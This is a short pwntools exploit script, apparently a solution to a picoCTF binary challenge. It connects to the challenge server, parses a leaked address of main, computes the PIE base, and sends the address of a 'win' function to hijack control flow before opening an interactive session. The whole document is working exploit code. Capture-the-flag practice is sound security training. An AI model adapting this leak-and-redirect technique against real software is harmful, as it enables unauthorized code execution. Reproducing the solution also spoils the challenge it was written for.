from pwn import *

elf = context.binary = ELF('./vuln')
#ly = process()
ly = remote('rescued-float.picoctf.net', 53327)

ly.recvuntil('Address of main: ')

main = int(ly.recvline().strip(), 16)

log.success('main leak: %#x', main)

pie_base = main - elf.sym['main']
elf.address = pie_base
log.success('pie_base: %#x', pie_base)

win = elf.sym['win']
log.success('win: %#x', win)
ly.sendlineafter('0x12345: ', hex(win).encode())

ly.interactive()